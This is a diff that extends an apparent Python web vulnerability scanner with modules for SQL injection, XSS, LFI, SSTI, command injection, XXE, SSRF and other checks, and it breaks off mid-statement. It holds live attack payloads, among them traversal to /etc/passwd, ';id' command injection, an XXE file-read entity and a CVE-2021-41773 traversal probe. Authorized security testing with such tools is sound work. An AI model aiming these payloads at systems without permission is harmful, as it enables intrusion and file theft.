@@ -25,7 +25,9 @@ LEGAL: Only test applications you own or have explicit permission to test.
 from __future__ import annotations
 
 import argparse
+import base64
 import difflib
+import html
 import json
 import re
 import sys
@@ -278,13 +280,25 @@ class HttpClient:
             time.sleep(self.delay)
         kw.setdefault("timeout", self.timeout)
         kw.setdefault("allow_redirects", True)
-        try:
-            resp = self.sess.request(method, url, **kw)
-            self.last_error = None
-            return resp
-        except requests.RequestException as e:
-            self.last_error = f"{type(e).__name__}: {e}"
-            return None
+        last_exc = None
+        for attempt in range(2):          # retry once on transient failures
+            try:
+                resp = self.sess.request(method, url, **kw)
+                self.last_error = None
+                # WAF / challenge detection (so users see WHY results are empty)
+                if resp.status_code in (403, 429, 503) and any(
+                        k in resp.text[:2000].lower()
+                        for k in ("cloudflare", "captcha", "access denied",
+                                  "unusual traffic", "blocked", "akamai")):
+                    self.last_error = (f"WAF/challenge page detected (HTTP {resp.status_code}) "
+                                       f"— the target is filtering automated scanners")
+                return resp
+            except requests.RequestException as e:
+                last_exc = e
+                if attempt == 0:
+                    time.sleep(1.0)
+        self.last_error = f"{type(last_exc).__name__}: {last_exc}"
+        return None
 
     def get(self, url: str, **kw):
         return self.request("GET", url, **kw)
@@ -330,8 +344,17 @@ def normalize_url(u: str) -> str:
 
 
 def same_origin(a: str, b: str) -> bool:
+    """Same site check — www/non-www and http/https treated as one site
+    (real sites almost always redirect; the old strict check made crawls
+    return ZERO pages on real targets)."""
     pa, pb = urllib.parse.urlsplit(a), urllib.parse.urlsplit(b)
-    return pa.netloc == pb.netloc and pa.scheme == pb.scheme
+    ha = (pa.netloc or "").lower().split(":")[0]
+    hb = (pb.netloc or "").lower().split(":")[0]
+    if ha.startswith("www."):
+        ha = ha[4:]
+    if hb.startswith("www."):
+        hb = hb[4:]
+    return bool(ha) and ha == hb
 
 
 # ============================================================================
@@ -411,10 +434,11 @@ class Crawler:
 class SqliScanner:
     """Error-based + Boolean-blind + Time-based SQLi detection."""
 
-    def __init__(self, client: HttpClient, state: ScanState, time_delay: float = 5.0):
+    def __init__(self, client: HttpClient, state: ScanState,
+                 time_delay: Optional[float] = 5.0):
         self.client = client
         self.state = state
-        self.time_delay = time_delay
+        self.time_delay = time_delay      # None -> skip time-based module
 
     # -- helpers -------------------------------------------------------------
     @staticmethod
@@ -486,7 +510,7 @@ class SqliScanner:
                     tested_error = True
                     break
 
-            # --- 2. Boolean-based blind ---
+            # --- 2. Boolean-based blind (second payload pair as confirmation) ---
             if not tested_error:
                 t_resp = self._send(url, method, param, SQL_BOOLEAN_TRUE[0], base_params, baseline)
                 f_resp = self._send(url, method, param, SQL_BOOLEAN_FALSE[0], base_params, baseline)
@@ -497,19 +521,29 @@ class SqliScanner:
                     if (sim_t > 0.90 and sim_f < 0.85) or \
                        (sim_f > 0.90 and sim_t < 0.85) or \
                        (sim_tf < 0.75 and abs(sim_t - sim_f) > 0.15):
-                        self.state.add(Finding(
-                            vuln_type="SQL Injection (Boolean-Based Blind)",
-                            severity="High", url=url, parameter=param,
-                            payload=f"TRUE={SQL_BOOLEAN_TRUE[0]} / FALSE={SQL_BOOLEAN_FALSE[0]}",
-                            evidence=f"similarity baseline/true={sim_t:.2f} "
-                                     f"baseline/false={sim_f:.2f} true/false={sim_tf:.2f}",
-                            detail="Responses differ significantly between TRUE and FALSE "
-                                   "boolean conditions — classic blind SQLi behavior.",
-                            cvss_hint=8.6,
-                        ))
+                        # Confirmation with a second, different payload pair
+                        t2 = self._send(url, method, param, SQL_BOOLEAN_TRUE[1], base_params, baseline)
+                        f2 = self._send(url, method, param, SQL_BOOLEAN_FALSE[1], base_params, baseline)
+                        if t2 is not None and f2 is not None:
+                            s_t2 = self._similarity(t2.text, t_resp.text)
+                            s_f2 = self._similarity(f2.text, f_resp.text)
+                            if s_t2 > 0.85 and s_f2 > 0.85 and \
+                               self._similarity(t2.text, f2.text) < 0.85:
+                                self.state.add(Finding(
+                                    vuln_type="SQL Injection (Boolean-Based Blind)",
+                                    severity="High", url=url, parameter=param,
+                                    payload=f"TRUE={SQL_BOOLEAN_TRUE[0]} / FALSE={SQL_BOOLEAN_FALSE[0]}",
+                                    evidence=f"similarity baseline/true={sim_t:.2f} "
+                                             f"baseline/false={sim_f:.2f} true/false={sim_tf:.2f} "
+                                             f"(confirmed with a second payload pair)",
+                                    detail="Responses differ consistently between TRUE and FALSE "
+                                           "boolean conditions across two payload pairs — "
+                                           "classic blind SQLi behavior.",
+                                    cvss_hint=8.6,
+                                ))
 
-            # --- 3. Time-based blind (skip if already confirmed by errors) ---
-            if not tested_error:
+            # --- 3. Time-based blind (double-confirmed to kill latency FPs) ---
+            if not tested_error and self.time_delay:
                 payloads = [(name, tpl.format(d=int(self.time_delay)))
                             for name, tpl in SQL_TIME_PAYLOADS]
                 for dbms, payload in payloads:
@@ -517,17 +551,22 @@ class SqliScanner:
                     resp = self._send(url, method, param, payload, base_params, baseline)
                     elapsed = time.time() - t0
                     if resp is not None and elapsed >= self.time_delay - 0.5:
-                        self.state.add(Finding(
-                            vuln_type="SQL Injection (Time-Based Blind)",
-                            severity="High", url=url, parameter=param,
-                            payload=payload,
-                            evidence=f"response delayed {elapsed:.1f}s (expected {int(self.time_delay)}s) "
-                                     f"— engine hint: {dbms}",
-                            detail="The server response was delayed only when a time-based SQL "
-                                   "payload was injected, indicating injectable query.",
-                            cvss_hint=8.6,
-                        ))
-                        break
+                        # Confirmation: must delay AGAIN (rules out network hiccups)
+                        t1 = time.time()
+                        self._send(url, method, param, payload, base_params, baseline)
+                        elapsed2 = time.time() - t1
+                        if elapsed2 >= self.time_delay - 0.5:
+                            self.state.add(Finding(
+                                vuln_type="SQL Injection (Time-Based Blind)",
+                                severity="High", url=url, parameter=param,
+                                payload=payload,
+                                evidence=f"response delayed {elapsed:.1f}s then {elapsed2:.1f}s "
+                                         f"(expected {int(self.time_delay)}s) — engine hint: {dbms}",
+                                detail="The server response was delayed twice only when a "
+                                       "time-based SQL payload was injected (double-confirmed).",
+                                cvss_hint=8.6,
+                            ))
+                            break
 
     # -- URL path injection ----------------------------------------------------
     def scan_path(self, url: str) -> None:
@@ -586,12 +625,18 @@ class XssScanner:
 
     @staticmethod
     def _is_reflected(payload: str, body: str) -> Tuple[bool, bool]:
-        """Returns (raw_reflected, executable)."""
+        """Returns (raw_reflected, executable).
+
+        Executable requires the payload to appear VERBATIM (unescaped) —
+        an HTML-escaped reflection is NOT XSS and must not be reported
+        as executable (this killed false positives on real sites)."""
         raw = payload in body
-        exec_ = bool(XSS_CONFIRM_RX.search(body)) or (
-            payload.lower().startswith("<script") and payload in body
-        )
-        return raw, exec_
+        escaped = (html.escape(payload) in body) or (urllib.parse.quote(payload) in body)
+        looks_active = any(t in payload.lower() for t in
+                           ("<script", "<img", "<svg", "onerror", "onload",
+                            "ontoggle", "<iframe", "javascript:", "<body"))
+        exec_ = raw and (looks_active or bool(XSS_CONFIRM_RX.search(body)))
+        return (raw or escaped), exec_
 
     def _test_target(self, url: str, method: str, param: str,
                      base_params: Dict[str, str]) -> None:
@@ -765,6 +810,654 @@ class MisconfigAudit:
 
 
 # ============================================================================
+# Module 6 — Parameter discovery (the key to finding vulns on real sites)
+# ============================================================================
+PARAM_MARKER = "d4rk8f3a1c"          # random-looking reflection marker
+COMMON_PARAMS = [
+    "id", "page", "q", "search", "cat", "file", "path", "name", "user",
+    "url", "redirect", "template", "cmd", "exec", "lang", "view", "item",
+    "debug", "callback", "return", "next", "sort", "order", "filter",
+    "type", "query", "s", "keyword", "input", "data", "content", "email",
+    "username", "token", "doc", "folder", "dir", "root", "include", "site",
+]
+
+
+class ParamFuzzer:
+    """Discovers hidden/undocumented parameters by probing each candidate
+    and checking for reflection or significant response change."""
+
+    def __init__(self, client: HttpClient, state: ScanState, max_pages: int = 25):
+        self.client = client
+        self.state = state
+        self.max_pages = max_pages
+
+    def run(self) -> None:
+        info("Parameter discovery (hidden parameter fuzzing)")
+        found = 0
+        for url in list(self.state.crawled_urls)[: self.max_pages]:
+            existing = self.state.params.get(url, set())
+            if len(existing) >= 2:
+                continue
+            parsed = urllib.parse.urlsplit(url)
+            clean = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))
+            base_resp = self.client.get(clean)
+            if base_resp is None:
+                continue
+            base_len = len(base_resp.text)
+            for p in COMMON_PARAMS:
+                if p in existing:
+                    continue
+                resp = self.client.get(clean, params={p: PARAM_MARKER})
+                if resp is None:
+                    continue
+                if PARAM_MARKER in resp.text:
+                    self.state.params.setdefault(url, set()).add(p)
+                    found += 1
+                elif abs(len(resp.text) - base_len) > 120:
+                    self.state.params.setdefault(url, set()).add(p)
+                    found += 1
+        ok(f"Parameter discovery: {found} active parameter(s) found")
+
+
+# ============================================================================
+# Module 7 — Advanced vulnerability checks
+# ============================================================================
+LFI_PAYLOADS = [
+    ("../../../../etc/passwd", re.compile(r"root:.*:0:0:")),
+    ("....//....//....//....//etc/passwd", re.compile(r"root:.*:0:0:")),
+    ("../../../../windows/win.ini", re.compile(r"\[fonts\]")),
+    ("file:///etc/passwd", re.compile(r"root:.*:0:0:")),
+    ("php://filter/convert.base64-encode/resource=index", re.compile(r"PD9waH|cGhw")),
+    ("/proc/self/environ", re.compile(r"PATH=|SHELL=")),
+]
+LFI_PARAM_NAMES = {"file", "path", "page", "doc", "folder", "dir", "root",
+                   "include", "template", "view", "name", "lang", "item"}
+
+SSTI_PAYLOADS = [
+    ("{{1337*2}}", "2674"),
+    ("${1337*2}", "2674"),
+    ("<%=1337*2%>", "2674"),
+    ("#{1337*2}", "2674"),
+    ("{{7*'7'}}", "7777777"),
+]
+
+CMDI_PAYLOADS = [
+    (";id", re.compile(r"uid=\d+\([^)]+\)")),
+    ("|id", re.compile(r"uid=\d+\([^)]+\)")),
+    ("`id`", re.compile(r"uid=\d+\([^)]+\)")),
+    ("$(id)", re.compile(r"uid=\d+\([^)]+\)")),
+    ("& type c:\\windows\\win.ini", re.compile(r"\[fonts\]", re.I)),
+    ("| type c:\\windows\\win.ini", re.compile(r"\[fonts\]", re.I)),
+]
+CMDI_PARAM_NAMES = {"cmd", "exec", "command", "ping", "host", "ip", "q",
+                    "run", "shell", "process", "daemon"}
+
+OPEN_REDIRECT_PARAMS = {"url", "redirect", "redir", "next", "return",
+                        "returnto", "return_url", "goto", "dest", "destination",
+                        "continue", "target", "link", "rurl", "site", "view"}
+OPEN_REDIRECT_PAYLOAD = "https://dark-redirect-check.example"
+
+CRLF_PAYLOAD = "%0d%0aX-DARK-Injected:%201"
+
+DIR_LISTING_RX = re.compile(r"Index of /|Directory listing for /|<title>Index of", re.I)
+
+JS_LIBS = [
+    (re.compile(r"jquery[.\-/](\d+)\.(\d+)\.(\d+)", re.I), "jQuery",
+     lambda a, b, c: (a, b, c) < (3, 5, 0), "CVE-2020-11022/11023 XSS"),
+    (re.compile(r"angular[.\-/](\d+)\.(\d+)\.(\d+)", re.I), "AngularJS",
+     lambda a, b, c: (a, b, c) < (1, 8, 0), "Sandbox escapes / XSS"),
+    (re.compile(r"bootstrap[.\-/](\d+)\.(\d+)\.(\d+)", re.I), "Bootstrap",
+     lambda a, b, c: (a, b, c) < (3, 4, 0), "XSS in tooltip/data attributes"),
+    (re.compile(r"lodash[.\-/](\d+)\.(\d+)\.(\d+)", re.I), "Lodash",
+     lambda a, b, c: (a, b, c) < (4, 17, 21), "Prototype pollution"),
+    (re.compile(r"handlebars[.\-/](\d+)\.(\d+)\.(\d+)", re.I), "Handlebars",
+     lambda a, b, c: (a, b, c) < (4, 7, 7), "Prototype pollution RCE"),
+]
+
+SENSITIVE_RX = [
+    (re.compile(r"AKIA[0-9A-Z]{16}"), "AWS Access Key ID", "Critical"),
+    (re.compile(r"ghp_[A-Za-z0-9]{36}"), "GitHub personal access token", "Critical"),
+    (re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"), "Private key material", "Critical"),
+    (re.compile(r'"password"\s*:\s*"[^"\s]{3,}"'), "Password inside JSON/JS", "High"),
+    (re.compile(r"(?i)(api[_-]?key|apikey|secret)\s*[:=]\s*['\"][^'\"]{8,}['\"]"),
+     "Hard-coded API key / secret", "High"),
+    (re.compile(r"slack\.com/api/(?:services/)?[A-Za-z0-9/_\-]{10,}"), "Slack webhook/token", "High"),
+    (re.compile(r"[\w.+-]+@[\w-]+\.[\w.]{2,}"), "Email address", "Info"),
+]
+
+
+class AdvancedScanner:
+    """Second-wave vulnerability modules for broader coverage."""
+
+    def __init__(self, client: HttpClient, state: ScanState):
+        self.client = client
+        self.state = state
+
+    # -- helpers -------------------------------------------------------------
+    def _all_params(self):
+        """Yield (url, method, param, base_params) for every known parameter."""
+        for url, params in list(self.state.params.items()):
+            for p in sorted(params):
+                yield url, "GET", p, {q: "1" for q in params}
+        for form in self.state.forms:
+            names = [i["name"] for i in form["inputs"] if i["name"]
+                     and i["type"] not in ("submit", "button", "image", "file", "reset")]
+            for n in names:
+                yield form["url"], form["method"], n, {x: "test" for x in names}
+
+    @staticmethod
+    def _clean(url: str) -> str:
+        p = urllib.parse.urlsplit(url)
+        return urllib.parse.urlunsplit((p.scheme, p.netloc, p.path, "", ""))
+
+    def _send(self, url, method, param, value, base_params, follow=True):
+        params = dict(base_params)
+        params[param] = value
+        if method.upper() == "GET":
+            return self.client.request("GET", self._clean(url), params=params,
+                                       allow_redirects=follow)
+        return self.client.request("POST", self._clean(url), data=params,
+                                   allow_redirects=follow)
+
+    # -- LFI / path traversal ------------------------------------------------
+    def scan_lfi(self) -> None:
+        info("LFI / Path Traversal tests")
+        tested = set()
+        for url, method, param, base in self._all_params():
+            if param.lower() not in LFI_PARAM_NAMES and param.lower() not in {
+                    "file", "doc", "folder", "dir", "root", "include"}:
+                continue
+            key = (url, param)
+            if key in tested:
+                continue
+            tested.add(key)
+            for payload, rx in LFI_PAYLOADS:
+                resp = self._send(url, method, param, payload, base)
+                if resp is not None and rx.search(resp.text):
+                    self.state.add(Finding(
+                        vuln_type="Local File Inclusion / Path Traversal",
+                        severity="Critical", url=url, parameter=param,
+                        payload=payload, evidence="server returned file system content",
+                        detail="User input is used to read files — an attacker can "
+                               "exfiltrate /etc/passwd, source code, and secrets.",
+                        cvss_hint=8.6,
+                    ))
+                    break
+
+    # -- SSTI ----------------------------------------------------------------
+    def scan_ssti(self) -> None:
+        info("SSTI (template injection) tests")
+        for url, method, param, base in self._all_params():
+            for payload, expect in SSTI_PAYLOADS:
+                resp = self._send(url, method, param, payload, base)
+                if resp is None:
+                    continue
+                rx = re.compile(r"(?<!\d)" + re.escape(expect) + r"(?!\d)")
+                if expect == "7777777":
+                    ok_rx = re.compile(r"7777777")
+                else:
+                    ok_rx = rx
+                if ok_rx.search(resp.text) and payload[:2] + "1337*2" not in resp.text \
+                   and payload not in resp.text:
+                    self.state.add(Finding(
+                        vuln_type="Server-Side Template Injection (SSTI)",
+                        severity="Critical", url=url, parameter=param,
+                        payload=payload,
+                        evidence=f"expression evaluated: {payload} -> {expect}",
+                        detail="Template expression was evaluated server-side — "
+                               "often leads to remote code execution.",
+                        cvss_hint=9.0,
+                    ))
+                    break
+
+    # -- Command injection ---------------------------------------------------
+    def scan_cmdi(self) -> None:
+        info("Command injection tests")
+        for url, method, param, base in self._all_params():
+            if param.lower() not in CMDI_PARAM_NAMES:
+                continue
+            for payload, rx in CMDI_PAYLOADS:
+                resp = self._send(url, method, param, payload, base)
+                if resp is not None and rx.search(resp.text):
+                    self.state.add(Finding(
+                        vuln_type="OS Command Injection",
+                        severity="Critical", url=url, parameter=param,
+                        payload=payload, evidence="command output reflected in response",
+                        detail="Shell metacharacters in input are executed — full "
+                               "server compromise is possible.",
+                        cvss_hint=9.8,
+                    ))
+                    break
+
+    # -- Open redirect -------------------------------------------------------
+    def scan_open_redirect(self) -> None:
+        info("Open redirect tests")
+        tested = set()
+        for url, method, param, base in self._all_params():
+            if param.lower() not in OPEN_REDIRECT_PARAMS:
+                continue
+            key = (url, param)
+            if key in tested:
+                continue
+            tested.add(key)
+            # Do NOT follow redirects — we need the raw 3xx + Location header
+            resp = self._send(url, method, param, OPEN_REDIRECT_PAYLOAD, base, follow=False)
+            if resp is None:
+                continue
+            loc = resp.headers.get("Location", "")
+            if OPEN_REDIRECT_PAYLOAD in loc or OPEN_REDIRECT_PAYLOAD in resp.text[:3000]:
+                self.state.add(Finding(
+                    vuln_type="Open Redirect",
+                    severity="Medium", url=url, parameter=param,
+                    payload=OPEN_REDIRECT_PAYLOAD,
+                    evidence=f"redirects to attacker URL (Location: {loc[:80] or 'in body'})",
+                    detail="Open redirects enable phishing and token theft chains.",
+                    cvss_hint=6.1,
+                ))
+
+    # -- CORS ----------------------------------------------------------------
+    def scan_cors(self) -> None:
+        info("CORS misconfiguration tests")
+        evil = "https://dark-cors-check.example"
+        for url in list(self.state.crawled_urls)[:25]:
+            resp = self.client.get(url, headers={"Origin": evil})
+            if resp is None:
+                continue
+            acao = resp.headers.get("Access-Control-Allow-Origin", "")
+            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
+            if acao == evil or (acao == "*" and acac.lower() == "true"):
+                self.state.add(Finding(
+                    vuln_type="CORS Misconfiguration",
+                    severity="Medium", url=url,
+                    payload=f"Origin: {evil}",
+                    evidence=f"ACAO: {acao} | ACAC: {acac or '-'}",
+                    detail="Any website can read authenticated responses from this "
+                           "origin — enables cross-site data theft.",
+                    cvss_hint=6.5,
+                ))
+
+    # -- CRLF ----------------------------------------------------------------
+    def scan_crlf(self) -> None:
+        info("CRLF / header injection tests")
+        for url in list(self.state.crawled_urls)[:15]:
+            p = urllib.parse.urlsplit(url)
+            for inj_path in (p.path + CRLF_PAYLOAD,):
+                inj_url = urllib.parse.urlunsplit(
+                    (p.scheme, p.netloc, inj_path, p.query, ""))
+                resp = self.client.get(inj_url)
+                if resp is not None and "X-DARK-Injected" in "".join(
+                        f"{k}: {v}\n" for k, v in resp.headers.items()):
+                    self.state.add(Finding(
+                        vuln_type="CRLF / HTTP Header Injection",
+                        severity="Medium", url=url,
+                        payload=CRLF_PAYLOAD,
+                        evidence="injected header appears in the response",
+                        detail="CRLF injection enables response splitting, cache "
+                               "poisoning and session fixation.",
+                        cvss_hint=6.1,
+                    ))
+                    return
+
+    # -- Directory listing ---------------------------------------------------
+    def scan_dir_listing(self) -> None:
+        info("Directory listing tests")
+        for url in list(self.state.crawled_urls):
+            resp = self.client.get(url)
+            if resp is not None and DIR_LISTING_RX.search(resp.text[:2000]):
+                self.state.add(Finding(
+                    vuln_type="Directory Listing Enabled",
+                    severity="Medium", url=url,
+                    evidence="server renders an index of directory contents",
+                    detail="Directory listings leak files, backups and structure.",
+                    cvss_hint=5.3,
+                ))
+
+    # -- Vulnerable JS libraries --------------------------------------------
+    def scan_js_libs(self) -> None:
+        info("Vulnerable JavaScript library tests")
+        blobs = set()
+        for url in list(self.state.crawled_urls)[:30]:
+            resp = self.client.get(url)
+            if resp is not None:
+                blobs.add(resp.text)
+        seen = set()
+        for body in blobs:
+            for rx, name, is_vuln, cve in JS_LIBS:
+                for m in rx.finditer(body):
+                    ver = (int(m.group(1)), int(m.group(2)), int(m.group(3)))
+                    if is_vuln(*ver) and (name, ver) not in seen:
+                        seen.add((name, ver))
+                        self.state.add(Finding(
+                            vuln_type="Outdated / Vulnerable JS Library",
+                            severity="Medium", url=self.state.base_url,
+                            parameter=name,
+                            evidence=f"{name} {'.'.join(map(str, ver))} — {cve}",
+                            detail="Known-vulnerable frontend library version detected.",
+                            cvss_hint=5.0,
+                        ))
+
+    # -- Sensitive data exposure ---------------------------------------------
+    def scan_sensitive(self) -> None:
+        info("Sensitive data exposure tests")
+        seen = set()
+        for url in list(self.state.crawled_urls)[:40]:
+            resp = self.client.get(url)
+            if resp is None:
+                continue
+            for rx, name, sev in SENSITIVE_RX:
+                if name in seen and sev != "Info":
+                    continue
+                matches = rx.findall(resp.text)
+                if not matches:
+                    continue
+                if name == "Email address":
+                    uniq = set(m if isinstance(m, str) else m[0] for m in matches)
+                    if len(uniq) < 3:
+                        continue
+                    evidence = f"{len(uniq)} addresses (e.g. {sorted(uniq)[0]})"
+                    seen.add(name)
+                    self.state.add(Finding(
+                        vuln_type="Information Disclosure", severity="Info",
+                        url=url, parameter=name, evidence=evidence,
+                        detail="Email addresses exposed in page source — aids "
+                               "social engineering and user enumeration.",
+                        cvss_hint=2.0,
+                    ))
+                    continue
+                seen.add(name)
+                first = matches[0]
+                ev = first if isinstance(first, str) else first[0]
+                self.state.add(Finding(
+                    vuln_type="Sensitive Data Exposure", severity=sev,
+                    url=url, parameter=name,
+                    evidence=(ev[:60] + "...") if len(ev) > 60 else ev,
+                    detail="Hard-coded secrets/credentials in client-side code "
+                           "can be extracted by anyone.",
+                    cvss_hint=8.0 if sev == "Critical" else 5.5,
+                ))
+
+    # -- Known-vulnerable server versions + CVE probes ----------------------
+    KNOWN_VULN_VERSIONS = [
+        # (header_regex, condition, name, detail)
+        (re.compile(r"Apache/2\.4\.(49|50)", re.I), "Apache 2.4.49/2.4.50",
+         "Apache path traversal & RCE (CVE-2021-41773 / CVE-2021-42013)"),
+        (re.compile(r"Apache/2\.4\.(1[0-9]|2[0-9]|3[0-9]|4[0-8])\b", re.I), "Apache < 2.4.49",
+         "Multiple known CVEs — outdated Apache"),
+        (re.compile(r"nginx/1\.(0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16)\b", re.I), "nginx < 1.17",
+         "Outdated nginx with known CVEs"),
+        (re.compile(r"OpenSSL/1\.0\.|OpenSSL/0\.", re.I), "OpenSSL 1.0.x / 0.x",
+         "EOL OpenSSL — Heartbleed-era code base"),
+        (re.compile(r"PHP/5\.|PHP/7\.[0-3]\b", re.I), "PHP 5.x / 7.0-7.3",
+         "End-of-life PHP with unpatched CVEs"),
+        (re.compile(r"Microsoft-IIS/[67]\.", re.I), "IIS 6/7",
+         "Legacy IIS — known remote code execution CVEs"),
+        (re.compile(r"OpenSSH_[1-7]\.\d", re.I), "OpenSSH < 8.0",
+         "Outdated SSH daemon with known CVEs"),
+    ]
+    CVE_2021_41773_PATHS = [
+        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
+        "/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd",
+        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+    ]
+
+    def scan_known_vulns(self) -> None:
+        info("Known-vulnerable version tests (CVE database)")
+        resp = self.client.get(self.state.base_url)
+        if resp is None:
+            return
+        blob = "; ".join(f"{k}: {v}" for k, v in resp.headers.items())
+        seen = set()
+        for rx, name, detail in self.KNOWN_VULN_VERSIONS:
+            m = rx.search(blob)
+            if m and name not in seen:
+                seen.add(name)
+                self.state.add(Finding(
+                    vuln_type="Known-Vulnerable Software Version",
+                    severity="High", url=self.state.base_url, parameter=name,
+                    evidence=m.group(0),
+                    detail=detail + " — verify and patch immediately.",
+                    cvss_hint=7.5,
+                ))
+        # Direct CVE-2021-41773 / 42013 exploit probe (precise, zero FP)
+        for path in self.CVE_2021_41773_PATHS:
+            target = urllib.parse.urljoin(self.state.base_url, path)
+            r = self.client.get(target)
+            if r is not None and re.search(r"root:.*:0:0:", r.text):
+                self.state.add(Finding(
+                    vuln_type="Apache Path Traversal RCE (CVE-2021-41773/42013)",
+                    severity="Critical", url=target,
+                    evidence="server returned /etc/passwd via traversal payload",
+                    detail="Unpatched Apache 2.4.49/50 allows path traversal and "
+                           "remote code execution — full server compromise.",
+                    cvss_hint=10.0,
+                ))
+                break
+
+    # -- CSRF (missing anti-CSRF tokens) ------------------------------------
+    CSRF_RX = re.compile(r"csrf|xsrf|_token|authenticity_token|anti[_-]?forgery",
+                         re.I)
+
+    def scan_csrf(self) -> None:
+        info("CSRF protection tests (forms)")
+        for form in self.state.forms:
+            if form.get("method", "get").lower() != "post":
+                continue
+            names = {i["name"].lower() for i in form["inputs"] if i["name"]}
+            has_token = any(self.CSRF_RX.search(n) for n in names)
+            if not has_token:
+                self.state.add(Finding(
+                    vuln_type="CSRF — Missing Anti-CSRF Token",
+                    severity="Medium", url=form.get("url", self.state.base_url),
+                    evidence=f"POST form without any CSRF token field "
+                             f"(inputs: {sorted(names) or 'none'})",
+                    detail="State-changing form has no CSRF protection — cross-site "
+                           "request forgery attacks are possible.",
+                    cvss_hint=5.8,
+                ))
+
+    # -- XXE ----------------------------------------------------------------
+    XXE_PAYLOADS = [
+        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
+         "<r>&x;</r>", re.compile(r"root:.*:0:0:")),
+        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]>'
+         "<r>&x;</r>", re.compile(r"\[fonts\]", re.I)),
+    ]
+
+    def scan_xxe(self) -> None:
+        info("XXE (XML external entity) tests")
+        candidates = set()
+        for form in self.state.forms:
+            candidates.add(form.get("url", ""))
+        for url in list(self.state.crawled_urls)[:15]:
+            low = url.lower()
+            if any(k in low for k in ("xml", "soap", "import", "upload", "feed", "api")):
+                candidates.add(url)
+        for url in [c for c in candidates if c][:10]:
+            for payload, rx in self.XXE_PAYLOADS:
+                r = self.client.request("POST", url, data=payload.encode(),
+                                        headers={"Content-Type": "application/xml"})
+                if r is not None and rx.search(r.text):
+                    self.state.add(Finding(
+                        vuln_type="XML External Entity (XXE)",
+                        severity="Critical", url=url,
+                        payload="DOCTYPE ENTITY file disclosure",
+                        evidence="server resolved an external XML entity",
+                        detail="XML parser processes external entities — local file "
+                               "disclosure and SSRF.",
+                        cvss_hint=9.0,
+                    ))
+                    return
+
+    # -- SSRF ---------------------------------------------------------------
+    SSRF_PARAM_NAMES = {"url", "uri", "fetch", "proxy", "link", "src", "dest",
+                        "path", "site", "feed", "callback", "domain", "host",
+                        "image", "img", "load", "redirect"}
+    SSRF_PAYLOADS = [
+        ("http://127.0.0.1:1", re.compile(r"connection refused|failed to connect|"
+                                          r"actively refused|ECONNREFUSED|timed out", re.I)),
+        ("file:///etc/passwd", re.compile(r"root:.*:0:0:")),
+    ]
+
+    def scan_ssrf(self) -> None:
+        info("SSRF tests")
+        tested = set()
+        for url, method, param, base in self._all_params():
+            if param.lower() not in self.SSRF_PARAM_NAMES:
+                continue
+            key = (url, param)
+            if key in tested:
+                continue
+            tested.add(key)
+            for payload, rx in self.SSRF_PAYLOADS:
+                resp = self._send(url, method, param, payload, base)
+                if resp is not None and rx.search(resp.text):
+                    self.state.add(Finding(
+                        vuln_type="Server-Side Request Forgery (SSRF)",
+                        severity="High", url=url, parameter=param,
+                        payload=payload,
+                        evidence="server made a request to an attacker-controlled target",
+                        detail="The server fetches attacker-supplied URLs — internal "
+                               "network scanning and cloud metadata theft are possible.",
+                        cvss_hint=8.5,
+                    ))
+                    break
+
+    # -- Host header injection ----------------------------------------------
+    def scan_host_header(self) -> None:
+        info("Host header injection tests")
+        evil = "dark-host-check.example"
+        for url in list(self.state.crawled_urls)[:10]:
+            r = self.client.get(url, headers={"Host": evil})
+            if r is None:
+                continue
+            loc = r.headers.get("Location", "")
+            if evil in loc or (evil in r.text and evil not in url):
+                self.state.add(Finding(
+                    vuln_type="Host Header Injection",
+                    severity="Medium", url=url,
+                    payload=f"Host: {evil}",
+                    evidence=f"attacker host reflected in {'Location' if evil in loc else 'response body'}",
+                    detail="Host header is trusted — enables password-reset poisoning "
+                           "and cache poisoning chains.",
+                    cvss_hint=6.5,
+                ))
+
+    # -- JWT weaknesses ------------------------------------------------------
+    JWT_RX = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*")
+
+    def scan_jwt(self) -> None:
+        info("JWT analysis tests")
+        seen = set()
+        for url in list(self.state.crawled_urls)[:15]:
+            r = self.client.get(url)
+            if r is None:
+                continue
+            blobs = [r.text, "; ".join(f"{k}={v}" for k, v in r.headers.items()),
+                     "; ".join(f"{c.name}={c.value}" for c in r.cookies)]
+            for blob in blobs:
+                for m in self.JWT_RX.finditer(blob):
+                    token = m.group(0)
+                    if token in seen:
+                        continue
+                    seen.add(token)
+                    parts = token.split(".")
+                    try:
+                        header = json.loads(base64.urlsafe_b64decode(
+                            parts[0] + "=" * (-len(parts[0]) % 4)))
+                    except Exception:
+                        header = {}
+                    issues = []
+                    if str(header.get("alg", "")).lower() == "none":
+                        issues.append("algorithm 'none' (signature bypass)")
+                    if len(parts) > 2 and not parts[2]:
+                        issues.append("empty signature")
+                    if issues:
+                        self.state.add(Finding(
+                            vuln_type="Weak / Tamperable JWT",
+                            severity="High", url=url,
+                            evidence=f"JWT with {', '.join(issues)}",
+                            detail="Weak JWT configuration allows token forgery.",
+                            cvss_hint=8.0,
+                        ))
+
+    # -- Stored XSS ----------------------------------------------------------
+    STORED_MARKER = "drkstr3d7x"
+    STORED_PAYLOAD = f"<img src=x onerror=alert(1)>"
+
+    def scan_stored_xss(self) -> None:
+        info("Stored XSS tests (form submissions)")
+        for form in self.state.forms[:10]:
+            names = [i["name"] for i in form["inputs"] if i["name"]
+                     and i["type"] not in ("submit", "button", "image", "file", "reset")]
+            if not names:
+                continue
+            data = {n: (self.STORED_PAYLOAD + self.STORED_MARKER if i == 0 else "x")
+                    for i, n in enumerate(names)}
+            if form.get("method", "get").lower() == "get":
+                self.client.get(self._clean(form.get("url", "")), params=data)
+            else:
+                self.client.request("POST", form.get("url", ""), data=data)
+            # Re-visit the page and check if the payload persisted verbatim
+            for revisit in (form.get("url", ""), self.state.base_url):
+                r = self.client.get(self._clean(revisit))
+                if r is not None and self.STORED_MARKER in r.text and \
+                        self.STORED_PAYLOAD in r.text:
+                    self.state.add(Finding(
